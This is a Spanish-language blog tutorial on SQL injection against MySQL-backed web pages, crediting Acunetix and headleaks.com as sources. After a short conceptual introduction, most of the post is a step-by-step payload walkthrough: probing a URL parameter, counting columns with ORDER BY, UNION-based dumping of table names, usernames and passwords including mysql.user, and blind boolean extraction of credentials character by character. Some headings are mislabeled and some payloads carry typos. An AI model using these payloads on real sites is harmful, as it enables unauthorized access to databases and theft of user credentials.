---
title: 'Tutorial de inyección sql de principiante hasta avanzado'
date: 2020-01-07T20:43:00+01:00
draft: false
---

[![](https://1.bp.blogspot.com/-WmOoGoYk7DY/XhSTdl4Ym5I/AAAAAAAALlg/drF4oybeU5QA5ApcOie1FHZa0VJTiGN1gCLcBGAsYHQ/s640/c35173d95616f6bd906dcd60d3955f2d-1920x1080.jpg)](https://1.bp.blogspot.com/-WmOoGoYk7DY/XhSTdl4Ym5I/AAAAAAAALlg/drF4oybeU5QA5ApcOie1FHZa0VJTiGN1gCLcBGAsYHQ/s1600/c35173d95616f6bd906dcd60d3955f2d-1920x1080.jpg)

  
La inyección SQL (SQLi) se refiere a un ataque de inyección en el que un atacante puede ejecutar sentencias SQL maliciosas (también conocidas como carga útil maliciosa) que controlan el servidor de base de datos de una aplicación web (también conocido como Sistema de gestión de bases de datos relacionales - RDBMS). Dado que una vulnerabilidad de inyección SQL podría afectar a cualquier sitio web o aplicación web que haga uso de una base de datos basada en SQL, la vulnerabilidad es una de las vulnerabilidades de aplicaciones web más antiguas, más frecuentes y más peligrosas.

Al aprovechar una vulnerabilidad de inyección SQL, dadas las circunstancias correctas, un atacante puede usarla para omitir los mecanismos de autenticación y autorización de una aplicación web y recuperar el contenido de una base de datos completa. La inyección SQL también se puede usar para agregar, modificar y eliminar registros en una base de datos, lo que afecta la integridad de los datos.

En tal medida, la inyección SQL puede proporcionar a un atacante acceso no autorizado a datos confidenciales, incluidos datos de clientes, información de identificación personal (PII), secretos comerciales, propiedad intelectual y otra información confidencial.

* * *

###### ¿QUÉ ES LO PEOR QUE PUEDE HACER UN ATACANTE CON SQL?

SQL es un lenguaje de programación diseñado para administrar datos almacenados en un RDBMS, por lo tanto, SQL se puede utilizar para acceder, modificar y eliminar datos. Además, en casos específicos, un RDBMS también podría ejecutar comandos en el sistema operativo desde una instrucción SQL.

Teniendo en cuenta lo anterior, al considerar lo siguiente, es más fácil entender cuán lucrativo puede ser un ataque de inyección SQL exitoso para un atacante.

1\. Un atacante puede usar la inyección SQL para omitir la autenticación o incluso suplantar a usuarios específicos.

2\. Una de las funciones principales de SQL es seleccionar datos basados ​​en una consulta y generar el resultado de esa consulta. Una vulnerabilidad de inyección SQL podría permitir la divulgación completa de datos que residen en un servidor de base de datos.

3\. Dado que las aplicaciones web usan SQL para alterar los datos dentro de una base de datos, un atacante podría usar la inyección SQL para alterar los datos almacenados en una base de datos. La alteración de los datos afecta la integridad de los datos y podría causar problemas de reputación, por ejemplo, problemas como anular transacciones, alterar saldos y otros registros.

4\. SQL se utiliza para eliminar registros de una base de datos. Un atacante podría usar una vulnerabilidad de inyección SQL para eliminar datos de una base de datos. Incluso si se emplea una estrategia de respaldo adecuada, la eliminación de datos podría afectar la disponibilidad de una aplicación hasta que se restaure la base de datos.

5\. Algunos servidores de bases de datos están configurados (intencionalmente o no) para permitir la ejecución arbitraria de comandos del sistema operativo en el servidor de bases de datos. Dadas las condiciones adecuadas, un atacante podría usar la inyección de SQL como el vector inicial en un ataque de una red interna que se encuentra detrás de un firewall.

* * *

###### LA ANATOMÍA DE UN ATAQUE DE INYECCIÓN SQL

Una inyección SQL necesita solo dos condiciones para existir: una base de datos relacional que usa SQL y una entrada controlable por el usuario que se usa directamente en una consulta SQL.  
  
Los errores son muy útiles para los desarrolladores durante el desarrollo, pero si se habilitan en un sitio en vivo, pueden revelar mucha información a un atacante. Los errores de SQL tienden a ser descriptivos hasta el punto en que un atacante puede obtener información sobre la estructura de la base de datos y, en algunos casos, incluso enumerar una base de datos completa simplemente extrayendo información de los mensajes de error: esta técnica se conoce como basada en errores Inyección SQL. Hasta tal punto, los errores de la base de datos deben deshabilitarse en un sitio en vivo o registrarse en un archivo con acceso restringido.  
  
Otra técnica común para exfiltrar datos es aprovechar el operador UNION SQL, permitiendo que un atacante combine los resultados de dos o más instrucciones SELECT en un solo resultado. Esto obliga a la aplicación a devolver datos dentro de la respuesta HTTP; esta técnica se conoce como inyección SQL basada en unión.

Source: [acunetix.com](https://www.acunetix.com/websitesecurity/sql-injection/)

* * *

###### BLIND SQL INJECTION (LA PARTE MÁS DIFÍCIL)

Entonces, comencemos con algo de acción.  
  
**Verifique la vulnerabilidad.**  
  
Digamos que tenemos algunos sitios como este.

```
http://server/news.php?id=5
```

Copy

Ahora para probar si es vulnerable agregamos al final de la URL '(comilla simple), y eso sería:

```
http://server/news.php?id=5'
```

Copy

Entonces, si tenemos algún error como:

"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right etc ..." o algo similar que significa que es vulnerable a la inyección de SQL.

Encuentra el número de columnas

Para encontrar el número de columnas, usamos la instrucción ORDER BY (le dice a la base de datos cómo ordenar el resultado), ¿cómo usarlo? Bueno, simplemente incrementando el número hasta que obtengamos un error.

```
http://server/news.php?id=5 order by 1/* <-- no error  
http://server/news.php?id=5 order by 2/* <-- no error  
http://server/news.php?id=5 order by 3/* <-- no error  
http://server/news.php?id=5 order by 4/* <-- error (We get message like this Unknown column '4' in 'order clause' or something like that)
```

Copy

Eso significa que tiene 3 columnas, porque obtuvimos un error en 4.

Verifique la función UNION

Con la unión, podemos seleccionar más datos en una declaración SQL. Entonces tenemos:

```
http://server/news.php?id=5 union all select 1,2,3/* (We already found that number of columns are 3 in section 2). )
```

Copy

Si vemos algunos números en la pantalla, es decir, 1, 2 o 3, entonces UNION funciona.

Verifique la versión de MySQL

```
http://server/news.php?id=5 union all select 1,2,3/*
```

Copy

**NOTA:** Si / \* no funciona o recibe algún error, intente "-" es un comentario y es importante que nuestra consulta funcione correctamente.  
Digamos que tenemos el número 2 en la pantalla, ahora para verificar la versión, reemplazamos el número 2 con @@ version o version () y obtenemos algo como 4.1.33-log o 5.0.45 o similar.

```
http://server/news.php?id=5 union all select 1,@@version,3/*
```

Copy

Si obtiene un error "unión + mezcla ilegal de intercalaciones (IMPLICIT + COERCIBLE) ...", lo que deberá hacer es utilizar la función convert () como se muestra en el siguiente ejemplo.  
  
**Ejemplo:**

```
http://server/news.php?id=5 union all select 1,convert(@@version using latin1),3/*
```

Copy

O con hex () y unhex ()  
  
**Ejemplo:**

```
http://server/news.php?id=5 union all select 1,unhex(hex(@@version)),3/*
```

Copy

Y obtendrás la versión de MySQL

Obtener tabla y nombre de columna

Bueno, si la versión de MySQL es <5 (ejemplo, 4.1.33, 4.1.12 ...), debemos adivinar el nombre de la tabla y la columna en la mayoría de los casos. Los nombres de tabla comunes son: usuario / s, administrador / s, miembro / s. Los nombres de columna comunes son nombre de usuario, usuario, usr, nombre de usuario, contraseña, pwd, password, etc.

Ejemplo:

```
http://server/news.php?id=5 union all select 1,2,3 from admin/*
```

Copy

(Vemos el número 2 en la pantalla como antes, y eso es bueno).  
  
Obtenemos el nombre de usuario que se muestra en la pantalla, un ejemplo sería admin, o super admin, etc.  
  
Ahora para verificar si la contraseña de la columna existe.

```
http://server/news.php?id=5 union all select 1,password,3 from admin/*
```

Copy

Vimos la contraseña en la pantalla en hash o texto plano, depende de cómo esté configurada la base de datos, es decir, md5 hash, mysql hash, sha1. Ahora debemos completar la consulta para que se vea bien. Para eso podemos usar la función concat () (une cadenas)

Ejemplo:

```
http://server/news.php?id=5 union all select1,concat(username,0x3a,password),3 from admin/*
```

Copy

**NOTA:** Utilizamos 0x3a, es un valor hexadecimal (0x3a es el valor hexadecimal para la columna). Otro método es usar char (58) en modo ascii.

```
http://server/news.php?id=5 union all select 1,concat(username,char(58), password),3 from admin/*
```

Copy

Ahora se muestra el nombre de usuario: contraseña en la pantalla, es decir, admin: admin o admin: somehash cuando tenga esto, puede iniciar sesión como admin o algún superusuario. Si no puede adivinar el nombre correcto de la tabla, siempre puede probar "mysql.user", según el siguiente ejemplo:

```
http://server/news.php?id=5 union all select 1,concat(user,0x3a,password),3 from mysql.user/*
```

Copy

MySQL 5

Para esto necesitamos la tabla "información\_esquema". Contiene todas las tablas y columnas de arquitectura de la base de datos. Para obtener las tablas, usamos "nombre\_tabla" e "información\_esquema.tables".

Ejemplo:

```
http://server/news.php?id=5 union all select 1,table_name,3 from information_schema.tables/*
```

Copy

Aquí reemplazamos el número 2 con "table\_name" para obtener la primera tabla de "information\_schema" .tables que se muestran en la pantalla. Además, necesitaremos agregar LIMIT al final de la consulta para enumerar todas las tablas.

Ejemplo:

```
http://server/news.php?id=5 union all select 1,table_name,3 from infor-mation_schema.tables limit 0,1/*
```

Copy

**NOTA:** Ahora que ponemos 0,1 (para obtener 1 resultado a partir del 0) para ver la segunda tabla, cambiamos "limit 0,1" a "limit 1,1".

Ejemplo:

```
http://server/news.php?id=5 union all select 1,table_name,3 from information_schema.tables limit 1,1/*
```

Copy

Se muestra la segunda tabla. Si desea hacer lo mismo para la tercera tabla, sigamos usando: "limit 2,1"

Ejemplo:

```
http://server/news.php?id=5 union all select 1,table_name,3 from information_schema.tables limit 2,1/*
```

Copy

Continúe incrementando hasta que obtenga algunos útiles como db\_admin, poll\_user, auth, auth\_user, etc.  
  
Para obtener los nombres de columna, el método es similar. Aquí usamos "column\_name" e "infor-mation\_schema.columns" según el siguiente ejemplo:

```
http://server/news.php?id=5 union all select 1,column_name,3 from information_schema.columns limit 0,1/*
```

Copy

La primera columna se muestra, así que para avanzar y recuperar la segunda, necesitaremos cambiar nuevamente "limit 0,1" a "limit 1,1".

Ejemplo:

```
http://server/news.php?id=5 union all select 1,column_name,3 from information_schema.columns limit 1,1/*
```

Copy

Se muestra la segunda columna, así que siga aumentando hasta que obtenga algo como username, user, login, password, pass, passwd, etc... Si desea mostrar los nombres de columna para una tabla específica, use la siguiente consulta:

Ejemplo:

```
http://server/news.php?id=5 union all select 1,column_name,3 from information_schema.columns where table_name='users'/*
```

Copy

Ahora se muestra el nombre de la columna en los usuarios de la tabla. Tenga en cuenta que esto no funcionará si las comillas mágicas están activadas. Digamos que encontramos columnas de usuario, contraseña y correo electrónico, ahora para completar la consulta, las reunimos todas y para eso, usaremos concat ().

Ejemplo:

```
http://server/news.php?id=5 union all select 1, concat(user,0x3a,pass,0x3a,email) from users/*
```

Copy

Del ejemplo anterior, obtendremos el usuario: pass: correo electrónico de los usuarios de la tabla.

* * *

###### BLIND SQL INJECTION

La inyección ciega es un poco más complicada que la inyección clásica, pero puede ser con la siguiente metodología. Primero debemos verificar si el sitio web es vulnerable o no.  
  
Una consulta normal debe ser según el siguiente ejemplo:

```
http://server/news.php?id=5 and 1=1 <-- this is always true
```

Copy

Ahora para verificar si el sitio web está sujeto a una inyección SQL ciega, simplemente cambie "1" por "2"

```
http://server/news.php?id=5 and 1=2 <-- this is false
```

Copy

Si su página se devuelve con algún contenido que falta, como texto o imágenes, eso simplemente significa que la página es vulnerable a la inyección SQL oculta.

Obtenga la versión de MySQL

Para obtener la versión de MySQL en un ataque ciego, usamos subcadena.

```
http://server/news.php?id=5 and substring(@@version,1,1)=4
```

Copy

La consulta anterior debería devolver VERDADERO si la versión de MySQL es "4". Reemplace "4" por "5", y si la consulta devuelve VERDADERO, podemos entender que la versión actual de MySQL es "5".

Ejemplo:

```
http://server/news.php?id=5 and substring(@@version,1,1)=5
```

Copy

* * *

###### PROBAR SI SUBSELECT FUNCIONA

En algunos casos, la función "seleccionar" no funciona. En este caso, podemos utilizar "subselección" como alternativa.

Ejemplo:

```
http://server/news.php?id=5 and (select 1)=1
```

Copy

Si la página se carga correctamente, la función "subseleccionar" está funcionando. El siguiente paso será ver si podemos acceder a "mysql.user".

Ejemplo:

```
http://server/news.php?id=5 and (select 1 from mysql.user limit 0,1)=1
```

Copy

Si la página se carga correctamente, significa que tenemos acceso a "mysql.user". De acuerdo con esta última consulta, podemos si queremos usar este acceso para extraer, por ejemplo, alguna contraseña usando la función load\_file () y OUTFILE.

* * *

###### VER TABLA Y NOMBRES DE COLUMNA

Esta es la parte donde adivinar y buscar en Google será tu mejor amigo.

Ejemplo:

```
http://server/news.php?id=5 and (select 1 from users limit 0,1)=1
```

Copy

En el ejemplo anterior, usando "límite 0,1" nuestra consulta devolverá "1 fila de datos". Luego, si la página se carga normalmente sin contenido perdido, eso simplemente significa que se ha encontrado la tabla de "usuarios". Si obtiene FALSO, como algo de contenido faltante en la página, simplemente cambie el nombre de la tabla hasta que adivine el correcto.  
  
Ahora digamos que hemos encontrado que el nombre de la tabla es "usuarios", el siguiente paso será encontrar el nombre de la columna utilizando la misma metodología que antes. Comenzaremos con un nombre común como "contraseña".

Ejemplo:

```
http://server/news.php?id=5 and (select substring(concat(1,password),1,1) from users limit 0,1)=1
```

Copy

Si la página se carga correctamente, ahora sabemos que el nombre de la columna es "contraseña". Si obtenemos FALSO, intente con otro nombre común. En el ejemplo anterior, fusionamos "1" con la columna "contraseña", luego la función substring () devuelve el primer carácter.

* * *

###### EXTRAER DATOS DE LA BASE DE DATOS

Digamos que encontramos la tabla "usuarios" y las columnas "nombre de usuario" y "contraseña". Ahora es el momento de usarlo para extraer información relevante.

```
http://server/news.php?id=5 and ascii(substring((SELECT concat (username,0x3a,password) from users limit 0,1),1,1))>80
```

Copy

Con la consulta anterior, la función substring () devolverá el primer carácter del primer usuario en la tabla "usuarios". El ascii () convierte ese primer carácter en un valor ascii y luego lo compara con el símbolo mayor que ">".  
  
Bueno, en este paso ya entiendes que, si el carácter ascii es mayor que 80, la página se cargará correctamente. Tendremos que continuar hasta que seamos falsos.

```
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>95
```

Copy

Una vez más nos ponemos TRUE seguiremos aumentando.

```
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>98
```

Copy

Tenemos TRUE, continuemos.

```
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>99
```

Copy

¡Tenemos FALSE! Hemos terminado. Ahora encontramos que el primer carácter en el nombre de usuario es char (99). Usando el convertidor ascii podemos entender fácilmente que char (99) es la letra 'c'.  
  
Pasaremos ahora al segundo carácter.

```
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))>99
```

Copy

**NOTA:** Para continuar con el segundo carácter, hemos cambiado ", 1,1" a ", 2,1".

```
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>99
```

Copy

Igual que antes, si obtenemos TRUE, debemos continuar incrementándonos.

```
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>107
```

Copy

Obtenemos FALSE, intentemos con un número más bajo.

```
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>104
```

Copy

Obtenemos TRUE, luego podemos probar uno más alto.

```
http://server/news.php?id=5 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>105
```

Copy

¡Finalmente, obtenemos FALSE! Hemos terminado para el segundo carácter. Ahora descubrimos que el segundo carácter es char (105) y nuevamente usando el convertidor ascii podemos entender fácilmente que char (105) es la letra "i".  
  
La parte más difícil de esta metodología es el tiempo que necesitará para recuperar el nombre de usuario completo o la cadena que desee encontrar.

Fuente: [https://headleaks.com/](https://headleaks.com/2019/08/16/sql-injection-tutorial-for-beginners-aTROdTZIS05DSXVlYzlLS0lIZlEvZz09)

No olvides Compartir... 

  

  

Siguenos en twitter: [@disoftin](http://twitter.com/disoftin) - [@fredyavila](http://twitter.com/fredyavila)